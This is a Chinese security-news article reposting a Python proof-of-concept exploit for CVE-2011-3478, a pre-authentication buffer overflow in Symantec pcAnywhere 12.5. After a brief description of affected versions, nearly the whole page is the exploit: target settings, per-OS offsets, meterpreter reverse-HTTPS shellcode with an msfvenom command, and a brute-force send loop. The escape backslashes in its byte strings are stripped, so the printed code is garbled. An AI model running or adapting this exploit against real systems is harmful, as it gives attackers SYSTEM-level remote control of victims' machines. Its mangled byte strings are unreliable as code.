# Windows x86平台上的Symantec pcAnywhere 12.5.0远程代码执行漏洞

阅读量 **145466**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2015-11-06 10:52:26

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

译文仅供参考，具体内容表达以及含义原文为准。

影响版本:  

pcAnywhere v12.5.x 到 12.5.3  

Symantec IT Management Suite pcAnywhere Solution 7.0 (aka 12.5.x) and 7.1 (aka
12.6.x)  

影响平台:

windows x86  

# – Windows 2000  

# – Windows 2003 Server  

# – Windows 2008 Server  

# – Windows XP  

# – Windows Vista  

# – Windows 7  

漏洞描述:  

awhost32.exe在处理连接进来的请求时,存在一个漏洞,当处理认证请求时,没有对客户的输入进行长度检查,导致远程非认证的攻击者能够利用此漏洞执行任意代码,默认权限是"NT
AUTHORITYSYSTEM"  

限制：

1、只能X86平台

2、要求能输入帐号密码

3、无须认证码

POC代码:  

[https://www.exploit-db.com/exploits/38599/](https://www.exploit-db.com/exploits/38599/)

    
    
    #!/usr/bin/python
    ################################################################
    # Exploit Title: Symantec pcAnywhere v12.5.0 Windows x86 RCE
    # Date: 2015-10-31
    # Exploit Author: Tomislav Paskalev
    # Vendor Homepage: https://www.symantec.com/
    # Software Link: http://esdownload.symantec.com/akdlm/CD/MTV/pcAnywhere_12_5_MarketingTrialware.exe
    #   Version: Symantec pcAnywhere v12.5.0 Build 442 (Trial)
    # Vulnerable Software:
    #   Symantec pcAnywhere 12.5.x through 12.5.3
    #   Symantec IT Management Suite pcAnywhere Solution 7.0 (aka 12.5.x) and 7.1 (aka 12.6.x)
    # Tested on:
    #   Symantec pcAnywhere v12.5.0 Build 442 (Trial)
    #   --------------------------------------------    #   Microsoft Windows Vista Ultimate SP1 x86 EN
    #   Microsoft Windows Vista Ultimate SP2 x86 EN
    #   Microsoft Windows 2008 Enterprise SP2 x86 EN
    #   Microsoft Windows 7 Professional SP1 x86 EN
    #   Microsoft Windows 7 Ultimate SP1 x86 EN
    # CVE ID: 2011-3478
    # OSVDB-ID: 78532
    ################################################################
    # Vulnerability description:
    #   The application's module used for handling incoming connections
    #   (awhost32.exe) contains a flaw. When handling authentication
    #   requests, the vulnerable process copies user provided input
    #   to a fixed length buffer without performing a length check.
    #   A remote unauthenticated attacker can exploit this vulnerability
    #   to cause a buffer overflow and execute arbitrary code in the
    #   context of the exploited application (installed as a service
    #   by default, i.e. with "NT AUTHORITYSYSTEM" privileges).
    ################################################################
    # Target application notes:
    #   - the application processes one login attempt at a time
    #     (i.e. multiple parallel login requests are not possible)
    #   - available modules (interesting exploit wise):
    #     Name         | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll
    #    -------------------------------------------------------------    #     awhost32.exe | False  | False   | False |  False   | False
    #     ijl20.dll    | False  | False   | False |  False   | False
    #     IMPLODE.DLL  | False  | False   | False |  False   | False
    #    -------------------------------------------------------------    #   - supported Windows x86 operating systems (pcAnywhere v12.5)
    #       - Windows 2000
    #       - Windows 2003 Server
    #       - Windows 2008 Server
    #       - Windows XP
    #       - Windows Vista
    #       - Windows 7
    ################################################################
    # Exploit notes:
    #   - bad characters: "x00"
    #   - Windows Vista, Windows 2008 Server, Windows 7
    #     - after a shellcode execution event occurs, the
    #       application does not crash and remains fully functional
    #       - one successful shellcode execution event has a low
    #         success rate (applies to all OSes)
    #         - in order to achieve an overall more reliable exploit,
    #           multiple shellcode executions need to be performed
    #           (until the shellcode is successfully executed)
    #           - brute force is a feasible method 
    #             - multiple parallel brute force attacks are not possible
    #   - multiple valid offsets are available (i.e. not just the
    #     ones tested)
    ################################################################
    # Test notes:
    #   - all tested OSes
    #     - clean default installations
    #   - all OS specific statistics referenced in the exploit are
    #     based on the test results of 10 attempts per tested offset
    #     - all attempts were performed after a system reboot (VM)
    #     - the provided test results should be taken only as a rough guide
    #       - in practice it might occur that the number of attempts
    #         needed to achieve successful exploitation is (much)
    #         higher than the maximum value contained in the test
    #         results, or that the exploit does not succeed at all
    #         - other (untested) offsets might provide better results
    #   - not letting the OS and application load fully/properly before
    #     starting the exploit may lead to failed exploitation (this
    #     observation was made during the testing of the exploit and
    #     applies mostly to Windows 7)
    ################################################################
    # Patch:
    #   https://support.symantec.com/en_US/article.TECH179526.html
    #   https://support.norton.com/sp/en/us/home/current/solutions/v78694006_EndUserProfile_en_us
    ################################################################
    # Thanks to:
    #   Tal zeltzer (discovered the vulnerability)
    #   S2 Crew (Python PoC)
    ################################################################
    # In memoriam:
    #   msfpayload | msfencode  [2005 - 2015]
    ################################################################
    # References:
    #   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3478
    #   http://www.zerodayinitiative.com/advisories/ZDI-12-018/
    #   https://www.exploit-db.com/exploits/19407/
    ################################################################
    import socket
    import time
    import struct
    import string
    import sys
    ################################
    ###  HARDCODED TARGET INFO   ###
    ################################
    # target server info
    # >>> MODIFY THIS >>>
    targetServer = "192.168.80.227"
    targetPort   = 5631
    # Supported operating systems
    vistaUltSP1  = {
        'Version': 'Microsoft Windows Vista Ultimate SP1 x86 EN',
        'Offset': 0x03e60000,
        'PasswordStringLength': 3500,
        'TestAttempts': [8, 62, 35, 13, 8, 7, 11, 23, 8, 10]
    };
    vistaUltSP2  = {
        'Version': 'Microsoft Windows Vista Ultimate SP2 x86 EN',
        'Offset': 0x03e60000,
        'PasswordStringLength': 3500,
        'TestAttempts': [16, 27, 13, 17, 4, 13, 7, 9, 5, 16]
    };
    s2k8EntSP2   = {
        'Version': 'Microsoft Windows 2008 Enterprise SP2 x86 EN',
        'Offset': 0x03dd0000,
        'PasswordStringLength': 3500,
        'TestAttempts': [25, 5, 14, 18, 66, 7, 8, 4, 4, 24]
    };
    sevenProSP1  = {
        'Version': 'Microsoft Windows 7 Professional SP1 x86 EN',
        'Offset': 0x03a70000,
        'PasswordStringLength': 3500,
        'TestAttempts': [188, 65, 25, 191, 268, 61, 127, 136, 18, 98]
    };
    sevenUltSP1  = {
        'Version': 'Microsoft Windows 7 Ultimate SP1 x86 EN',
        'Offset': 0x03fa0000,
        'PasswordStringLength': 3500,
        'TestAttempts': [23, 49, 98, 28, 4, 31, 4, 42, 50, 42]
    };
    # target server OS
    # >>> MODIFY THIS >>>
    #OSdictionary = vistaUltSP1
    #OSdictionary = vistaUltSP2
    #OSdictionary = s2k8EntSP2
    #OSdictionary = sevenProSP1
    OSdictionary = sevenUltSP1
    # timeout values
    shellcodeExecutionTimeout = 30
    # client-server handshake
    initialisationSequence = "x00x00x00x00"
    handshakeSequence      = "x0dx06xfe"
    # username string
    usernameString         = "U" * 175
    # shellcode
    # available shellcode space: 1289 bytes
    # shellcode generated with Metasploit Framework Version: 4.11.4-2015090201 (Kali 2.0)
    # msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=192.168.80.223 LPORT=443 EXITFUNC=seh -e x86/shikata_ga_nai -b 'x00' -f python -v shellcode
    # >>> MODIFY THIS >>>
    shellcode =  ""
    shellcode += "xdaxd3xd9x74x24xf4xbfx2cx46x39x97x5d"
    shellcode += "x33xc9xb1x87x83xedxfcx31x7dx14x03x7d"
    shellcode += "x38xa4xccx6bxa8xaax2fx94x28xcbxa6x71"
    shellcode += "x19xcbxddxf2x09xfbx96x57xa5x70xfax43"
    shellcode += "x3exf4xd3x64xf7xb3x05x4ax08xefx76xcd"
    shellcode += "x8axf2xaax2dxb3x3cxbfx2cxf4x21x32x7c"
    shellcode += "xadx2exe1x91xdax7bx3ax19x90x6ax3axfe"
    shellcode += "x60x8cx6bx51xfbxd7xabx53x28x6cxe2x4b"
    shellcode += "x2dx49xbcxe0x85x25x3fx21xd4xc6xecx0c"
    shellcode += "xd9x34xecx49xddxa6x9bxa3x1ex5ax9cx77"
    shellcode += "x5dx80x29x6cxc5x43x89x48xf4x80x4cx1a"
    shellcode += "xfax6dx1ax44x1ex73xcfxfex1axf8xeexd0"
    shellcode += "xabxbaxd4xf4xf0x19x74xacx5cxcfx89xae"
    shellcode += "x3fxb0x2fxa4xadxa5x5dxe7xb9x57x3bx6c"
    shellcode += "x39xc0xb4xe5x57x79x6fx9exebx0exa9x59"
    shellcode += "x0cx25x84xbexa1x95xb4x13x16x72x01xc2"
    shellcode += "xe1x25x8ax3fx42x79x1fxc3x37x2exb7x78"
    shellcode += "xb6xd0x47x97x86xd1x47x67xd9x84x3fx54"
    shellcode += "x6ex11x95xaax3ax37x6fxa8xf7xbexf8x1d"
    shellcode += "x4cx16x73x50x25xc2x0cxa6x91xc1xb0x8b"
    shellcode += "x53x69x76x22xd9x46x0ax1axbcxeax87xf9"
    shellcode += "x09xb2x10xcfx14x3cxd0x56xb3xc8xbaxe0"
    shellcode += "x69x5ax3axa2xffxf0xf2x73x92x4bx79x10"
    shellcode += "x02x3fx4fxdcx8fxdbxe7x4fx6dx1dxa9x1d"
    shellcode += "x42x0cx70x80xccxe9xe5x0ax55x80x8axc2"
    shellcode += "x3dx2ax2fxa5xe2xf1xfex7dx2ax86x6bx08"
    shellcode += "x27x33x2axbbxbfxf9xd9x7ax7dx87x4fx10"
    shellcode += "xedx0dx1bxadx88xc6xb8x50x07x6ax74xf1"
    shellcode += "xd3x2dxd9x84x4exc0x8ex25x23x76x60xc9"
    shellcode += "xb4xd9xf5x64x0ex8exa6x22x05x39x3fx98"
    shellcode += "x96x8excax4fx79x54x64x26x33x3dxe7xaa"
    shellcode += "xa2xb1x90x59x4bx74x1axcexf9x0axc6xd8"
    shellcode += "xccx99x49x75x47x33x0ex1cxd5xf9xdexad"
    shellcode += "xa3x8cx1ex02x3bx38x96x3dx7dx39x7dxc8"
    shellcode += "x47x95x16xcbx75xfax63x98x2axa9x3cx4c"
    shellcode += "x9ax25x28x27x0cx8dx51x1dxc6x9bxa7xc1"
    shellcode += "x8exdbx8bxfdx4ex55x0bx97x4ax35xa6x77"
    shellcode += "x04xddx43xcex36x9bx53x1bx15xf7xf8xf7"
    shellcode += "xcfx9fxd3xf1xf7x24xd3x2bx82x1bx5exdc"
    shellcode += "xc3xeex78x34x90x10x7bxc5x4cx51x13xc5"
    shellcode += "x80x51xe3xadxa0x51xa3x2dxf3x39x7bx8a"
    shellcode += "xa0x5cx84x07xd5xccx28x21x3exa5xa6x31"
    shellcode += "xe0x4ax37x61xb6x22x25x13xbfx51xb6xce"
    shellcode += "x3ax55x3dx3excfx51xbfx03x4ax9dxcax66"
    shellcode += "x0cxddx6ax81xdbx1ex6bxaex12xd8xa6x7f"
    shellcode += "x65x2cxffx51xbdx60xd1x9fx8fxb3x2dx5b"
    shellcode += "x11xbdx1fx71x87xc2x0cx7ax82xa9xb2x47"
    ################################
    ###     BUFFER OVERFLOW      ###
    ###   STRING CONSTRUCTION    ###
    ################################
    # Calculate address values based on the OS offset
    pointerLocationAddress    = OSdictionary['Offset'] + 0x00005ad8
    pointerForECXplus8Address = OSdictionary['Offset'] + 0x00005ad4
    breakPointAddress         = OSdictionary['Offset'] + 0x000065af - 0x00010000
    # jump over the next 38 bytes (to the begining of the shellcode)
    jumpToShellcode    = "xebx26x90x90"
    # pointerLocationAddress - the memory address location of the "pointerForECXplus8" variable
    pointerLocation    = struct.pack('<L', pointerLocationAddress)
    # CALL ESI from the application module ijl20.dll [aslr=false,rebase=false,safeseh=false]
    callESI            = struct.pack('<L', 0x67f7ab23)
    # pointerForECXplus8Address - the memory address location of the start of the DDDD string in the shellcode (Offset + 0x00005acc + 0x8)
    pointerForECXplus8 = struct.pack('<L', pointerForECXplus8Address)
    # construct the password string which will cause a buffer overflow condition and exploit the vulnerability
    passwordString = (
        "A" * 945 +
        jumpToShellcode +
        pointerLocation +
        "D" * 4 +
        pointerForECXplus8 +
        callESI +
        "x90" * 20 +
        shellcode +
        "I" * (1289 - len(shellcode)) +
        "xaa" * (OSdictionary['PasswordStringLength'] - 945 - 4 * 5 - 20 - 1289)
    )
    ################################
    ###        FUNCTIONS         ###
    ################################
    # calculate and return the median value of the argument list
    def calculateMedian(targetList):
        sortedTargetList = sorted(targetList)
        targetListLength = len(targetList)
        medianIndex = (targetListLength - 1) / 2
        if (targetListLength % 2):
            return sortedTargetList[medianIndex]
        else:
            return ((sortedTargetList[medianIndex] + sortedTargetList[medianIndex + 1]) / 2)
    # print an indented line with a type prefix
    def printLine(infoType, indentDepth, textToDisplay):
        # [I]nformational
        if infoType == "I":
            print ('    ' * indentDepth),
            print "33[1;37m[*]33[1;m", textToDisplay
        # [E]rror
        elif infoType == "E":
            print ('    ' * indentDepth),
            print "33[1;31m[-]33[1;m", textToDisplay
        # [S]uccess
        elif infoType == "S":
            print ('    ' * indentDepth),
            print "33[1;32m[+]33[1;m", textToDisplay
        # [W]arning
        elif infoType == "W":
            print ('    ' * indentDepth),
            print "33[1;33m[!]33[1;m", textToDisplay
        # [N]one
        elif infoType == "N":
            print ('    ' * indentDepth),
            print textToDisplay
    # print the banner - general exploit info, target info, target OS statistics
    def printBanner():
        printLine ("I", 0, "Symantec pcAnywhere v12.5.0 Build 442 Login+Password field")
        printLine ("N", 1, "Buffer Overflow Remote Code Execution exploit (CVE-2011-3478)")
        printLine ("I", 1, "by Tomislav Paskalev")
        printLine ("I", 0, "Target server information")
        printLine ("I", 1, "IP address            : " + targetServer)
        printLine ("I", 1, "Port                  : " + str(targetPort))
        printLine ("I", 0, "Exploit target information")
        printLine ("I", 1, "Target OS             : " + OSdictionary['Version'])
        printLine ("I", 2, "Offset            : " + "{:#010x}".format(OSdictionary['Offset']))
        printLine ("I", 2, "Breakpoint (test) : " + "{:#010x}".format(breakPointAddress))
        printLine ("I", 2, "Password length   : " + str(OSdictionary['PasswordStringLength']))
        printLine ("I", 2, "Test result stats")
        printLine ("I", 3, "Test count    : " + str(len(OSdictionary['TestAttempts'])))
        printLine ("I", 3, "Reliability   : " + str(((len(OSdictionary['TestAttempts']) - OSdictionary['TestAttempts'].count(0)) * 100) / len(OSdictionary['TestAttempts'])) + "%")
        printLine ("I", 3, "Min attempt   : " + str(min([element for element in OSdictionary['TestAttempts'] if element > 0])))
        printLine ("I", 3, "Max attempt   : " + str(max(OSdictionary['TestAttempts'])))
        printLine ("I", 3, "Avg attempt   : " + str(sum(OSdictionary['TestAttempts']) / len(OSdictionary['TestAttempts'])))
        printLine ("I", 3, "Median attempt: " + str(calculateMedian(OSdictionary['TestAttempts'])))
    # connect to the server and return the socket
    def connectToServer(server, port):
        # create socket
        targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            targetSocket.connect((server, port))
        except socket.error as msg:
            if "[Errno 111] Connection refused" in str(msg):
                return None
        # return the opened socket
        return targetSocket
    # send the data to the server and return the response
    def sendDataToServer(destSocket, dataToSend):
        destSocket.send(dataToSend)
        try:
            receivedData = destSocket.recv(1024)
        except socket.error as msg:
            if "[Errno 104] Connection reset by peer" in str(msg):
                return None
        return receivedData
    # run the exploit; exits when finished or interrupted
    def runExploit():
        printLine ("I", 0, "Starting exploit...")
        attemptCounter = 0
        # brute force the service until the shellcode is successfully executed
        while True:
            # connect to the target server
            openSocket = connectToServer(targetServer, targetPort)
            attemptCounter += 1
            sleepTimer = 0
            printLine ("I", 1, "Attempt no. " + str(attemptCounter))
            printLine ("I", 2, "Sending initialisation sequence...")
            # send the data; check outcome
            while True:
                receivedData = sendDataToServer(openSocket, initialisationSequence)
                # check if server responded properly, if yes exit the loop
                if receivedData:
                    if "Please press <Enter>..." in receivedData:
                        break
                # exit if the service is unavailable
                if attemptCounter == 1:
                    printLine ("E", 3, "Service unavailable")
                    printLine ("I", 4, "Exiting...")
                    exit(1)
                # check if shellcode executed (based on a timer)
                if sleepTimer > shellcodeExecutionTimeout:
                    print ""
                    printLine ("S", 4, "Shellcode executed after " + str(attemptCounter - 1) + " attempts")
                    printLine ("I", 5, "Exiting...")
                    exit(1)
                # print waiting ticks
                sys.stdout.write('r')
                sys.stdout.write("             33[1;33m[!]33[1;m Connection reset - reinitialising%s" % ('.' * sleepTimer))
                sys.stdout.flush()
                # sleep one second and reconnect
                time.sleep(1)
                sleepTimer += 1
                openSocket.close()
                openSocket = connectToServer(targetServer, targetPort)
            if sleepTimer > 0:
                print ""
            printLine ("I", 2, "Sending handshake sequence...")
            openSocket.send(handshakeSequence)
            time.sleep(3)
            data = openSocket.recv(1024)
            printLine ("I", 2, "Sending username...")
            openSocket.send(usernameString)
            time.sleep(3)
            printLine ("I", 2, "Sending password...")
            openSocket.send(passwordString)
            openSocket.close()
            time.sleep(3)
    # main function
    if __name__ == "__main__":
        printBanner()
        try:
            runExploit()
        except KeyboardInterrupt:
            print ""
            sys.exit()
    # End of file

截图:  

本文翻译自360安全播报 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/82863](/post/id/82863)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

